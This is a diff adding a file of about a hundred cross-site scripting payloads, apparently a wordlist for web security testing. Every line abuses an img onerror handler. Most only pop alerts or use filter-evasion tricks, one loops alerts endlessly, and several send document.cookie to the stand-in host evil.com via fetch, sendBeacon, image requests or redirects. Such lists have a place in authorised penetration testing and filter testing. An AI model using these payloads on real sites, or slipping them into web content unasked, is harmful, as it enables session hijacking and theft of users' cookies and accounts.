@@ -1,0 +1,100 @@
+<img src=x onerror=alert(1)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.URL)>
+<img src=x onerror=alert(document.referrer)>
+<img src=x onerror=alert(navigator.userAgent)>
+<img src=x onerror=alert(navigator.platform)>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<img src=x onerror=alert(atob('WFNT'))>
+<img src=x onerror=alert(btoa('XSS'))>
+<img src=x onerror=eval('alert(1)')>
+<img src=x onerror=alert(/XSS/.source)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=this.onerror=null;alert(1)>
+<img src=x onerror=alert(this.src)>
+<img src=x onerror=alert(typeof alert)>
+<img src=x onerror=alert('🎯')>
+<img src=x onerror=alert('\u0041\u0042\u0043')>
+<img src=x onerror=alert(String.raw`XSS`)>
+<img src=x onerror=alert(document.forms.length)>
+<img src=x onerror=alert(document.images.length)>
+<img src=x onerror=alert(window.name)>
+<img src=x onerror=alert(top)>
+<img src=x onerror=alert(parent)>
+<img src=x onerror=window.open('https://evil.com')>
+<img src=x onerror=fetch('https://evil.com?cookie='+document.cookie)>
+<img src=x onerror=document.write('<script>alert(1)</script>')>
+<img src=x onerror=document.body.innerHTML='<h1>XSS</h1>'>
+<img src=x onerror=alert(document.body.innerHTML)>
+<img src=x onerror=this.src='data:image/png;base64,....';alert(1)>
+<img src=x onerror=alert(location)>
+<img src=x onerror=alert(document.location)>
+<img src=x onerror=while(1)alert(1)>
+<img src=x onerror=Function('alert(1)')()>
+<img src=x onerror=new Function`alert\x281\x29`>
+<img src=x onerror=setTimeout('alert(1)',100)>
+<img src=x onerror=window.onerror=alert;throw 1>
+<img src=x onerror=alert(new Date)>
+<img src=x onerror=alert(navigator.appName)>
+<img src=x onerror=alert(navigator.language)>
+<img src=x onerror=alert(window.innerWidth)>
+<img src=x onerror=alert(window.innerHeight)>
+<img src=x onerror=alert(window.location.search)>
+<img src=x onerror=alert(document.characterSet)>
+<img src=x onerror=alert(document.title)>
+<img src=x onerror=alert(document.compatMode)>
+<img src=x onerror=alert(window.history.length)>
+<img src=x onerror=alert(window.frames.length)>
+<img src=x onerror=alert(document.documentElement.innerHTML)>
+<img src=x onerror=console.log('XSS');alert(1)>
+<img src=x onerror=Object.constructor('alert(1)')()>
+<img src=x onerror=top.location='javascript:alert(1)'>
+<img src=x onerror=parent.location='javascript:alert(1)'>
+<img src=x onerror=this.onerror=null;eval('alert(1)')>
+<img src=x onerror='alert(1)'>
+<img src=x onerror="alert('XSS')">
+<img src=x onerror="this.onerror=null;alert(1)">
+<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+<img src=x onerror="alert('payload')">
+<img src=x onerror=(()=>alert(1))()>
+<img src=x onerror="(()=>alert(1))()">
+<img src=x onerror="setTimeout(function(){alert(1)},100)">
+<img src=x onerror="location='javascript:alert(1)'">
+<img src=x onerror="top.location='https://evil.com?c='+document.cookie">
+<img src=x onerror="window.name='XSS';alert(window.name)">
+<img src=x onerror="this.src='invalid';alert('retry')">
+<img src=x onerror="if(!window.injected){window.injected=true;alert(1);}">
+<img src=x onerror=top >
+<img src=x onerror="parent ">
+<img src=x onerror="['al','ert'].join('')(1)">
+<img src=x onerror="(new Function('alert(1)'))()">
+<img src=x onerror="this.onerror=null;setTimeout(alert,1,1)">
+<img src=x onerror="new Function('alert(1)')()">
+<img src=x onerror="alert(String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83))">
+<img src=x onerror="alert(1)//">
+<img src=x onerror="/*XSS*/alert(1)">
+<img src=x onerror="alert(1);void(0)">
+<img src=x onerror="alert(1);//comment">
+<img src=x onerror="alert('X'+'S'+'S')">
+<img src=x onerror="alert(/XSS/.source)">
+<img src=x onerror="location='//evil.com?cookie='+document.cookie">
+<img src=x onerror="alert([1,2,3].join(','))">
+<img src=x onerror="alert(window.top.location)">
+<img src=x onerror="document.write('<h1>XSS</h1>')">
+<img src=x onerror="let x='XSS';alert(x)">
+<img src=x onerror="typeof alert==='function'&&alert(1)">
+<img src=x onerror="var a=1,b=2;alert(a+b)">
+<img src=x onerror="alert(document.hasFocus())">
+<img src=x onerror="document.body.setAttribute('bgcolor','red');alert(1)">
+<img src=x onerror="console.warn('XSS'),alert(1)">
+<img src=x onerror="location.href='javascript:alert(1)'">
+<img src=x onerror="top.location.href='javascript:alert(1)'">
+<img src=x onerror="alert(document.activeElement.tagName)">
+<img src=x onerror="[].map.call('XSS', alert)">
+<img src=x onerror="alert(document.getElementsByTagName('body')[0].innerHTML)">
+<img src=x onerror="fetch('https://evil.com', {method: 'POST', body: document.cookie})">
+<img src=x onerror="navigator.sendBeacon('https://evil.com', document.cookie)">
+<img src=x onerror="new Image().src='https://evil.com?c='+document.cookie">
